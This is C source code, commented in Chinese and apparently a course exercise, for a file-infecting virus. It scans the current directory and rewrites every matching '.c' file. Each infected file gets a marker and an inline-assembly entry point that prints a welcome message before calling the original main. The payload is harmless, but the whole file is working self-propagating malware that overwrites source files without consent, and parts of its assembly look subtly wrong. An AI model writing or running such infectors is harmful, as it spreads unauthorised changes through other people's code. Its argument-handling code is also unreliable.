// VIRUS_INSERTED
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>

#define VIRUS_MARKER "// VIRUS_INSERTED"

// 检查文件是否已被感染
int is_infected(const char *filename) {
	FILE *fp = fopen(filename, "r");
	if (!fp)
		return 0;
	char line[256];
	int infected = 0;
	while (fgets(line, sizeof(line), fp)) {
		if (strstr(line, VIRUS_MARKER)) {
			infected = 1;
			break;
		}
	}
	fclose(fp);
	return infected;
}

// 感染目标文件
void infect_file(const char *filename) {
	// 读取原文件内容
	FILE *src = fopen(__FILE__, "r"); // 病毒自身代码
	FILE *dst = fopen(filename, "r");
	if (!src || !dst) {
		perror("Failed to open file");
		if (src)
			fclose(src);
		if (dst)
			fclose(dst);
		return;
	}

	// 读取目标文件全部内容
	fseek(dst, 0, SEEK_END);
	long size = ftell(dst);
	rewind(dst);
	char *content = (char *)malloc(size + 1);
	fread(content, 1, size, dst);
	content[size] = '\0';
	fclose(dst);

	// 重新以写入模式打开文件，插入病毒代码
	dst = fopen(filename, "w");
	if (!dst) {
		perror("Failed to write file");
		free(content);
		fclose(src);
		return;
	}

	// 插入病毒标记和编译提示
	fprintf(dst, "%s\n", VIRUS_MARKER);
	fprintf(dst, "// COMPILE WITH: gcc -nostartfiles -o %%s %%s -Wl,-e,_start\n\n");

	// 插入汇编代码（Ubuntu 20.04 适配）
	fprintf(dst, "__attribute__((used)) static void _payload() {\n");
	fprintf(dst, "  __asm__(\n");
	fprintf(dst, "    \".section .text\\n\"\n");
	fprintf(dst, "    \".global _start\\n\"\n");
	fprintf(dst, "    \"_start:\\n\"\n");
	fprintf(dst, "    \"    and $~15, %%rsp\\n\"     // 栈对齐\n");
	fprintf(dst, "    \"    sub $16, %%rsp\\n\"\n");
	fprintf(dst, "    \"    mov %%rsp, %%rbx\\n\"     // 保存原始栈指针到rbx\n");
	fprintf(dst, "    \"    call print_welcome\\n\"\n");
	fprintf(dst, "    \"    mov %%rbx, %%rsp\\n\"     // 恢复栈指针\n");
	fprintf(dst, "    \"    mov %%rsp, %%rsi\\n\"    // argv\n");
	fprintf(dst, "    \"    lea 8(%%rsp), %%rsi\\n\"  // argc = *argv\n");
	fprintf(dst, "    \"    lea 8(%%rsi,%%rdi,8), %%rdx\\n\"  // envp\n");
	fprintf(dst, "    \"    add $16, %%rsp\\n\"      // 恢复栈\n");
	fprintf(dst, "    \"    call main\\n\"\n");
	fprintf(dst, "    \"    mov %%rax, %%rdi\\n\"      // 将main返回值作为exit参数\n");
	fprintf(dst, "    \"    mov $60, %%rax\\n\"     // syscall: exit\n");
	fprintf(dst, "    \"    syscall\\n\"      // 退出进程\n");
	fprintf(dst, "    \"print_welcome:\\n\"\n");
	fprintf(dst, "    \"    mov $1, %%rax\\n\"       // syscall: write\n");
	fprintf(dst, "    \"    mov $1, %%rdi\\n\"       // fd = stdout\n");
	fprintf(dst, "    \"    lea msg(%%rip), %%rsi\\n\"\n");
	fprintf(dst, "    \"    mov $22, %%rdx\\n\"      // 消息长度\n");
	fprintf(dst, "    \"    syscall\\n\"\n");
	fprintf(dst, "    \"    ret\\n\"\n");
	fprintf(dst, "    \"msg:\\n\"\n");
	fprintf(dst, "    \"    .ascii \\\"Welcome to HNU CSAPP!\\\\n\\\"\\n\"\n");
	fprintf(dst, "  );\n");
	fprintf(dst, "}\n\n");

	// 写入原文件内容
	fwrite(content, 1, size, dst);

	// 清理资源
	free(content);
	fclose(src);
	fclose(dst);
}

// 主函数：感染当前目录下所有.c文件
int main() {
	DIR *dir = opendir(".");
	if (!dir) {
		perror("Failed to open directory");
		return 1;
	}

	struct dirent *ent;
	while ((ent = readdir(dir)) != NULL) {
		if (strstr(ent->d_name, ".c") && !strstr(ent->d_name, "virus.c")) {
			if (!is_infected(ent->d_name)) {
				printf("Infecting: %s\n", ent->d_name);
				infect_file(ent->d_name);
			}
		}
	}

	closedir(dir);
	return 0;
}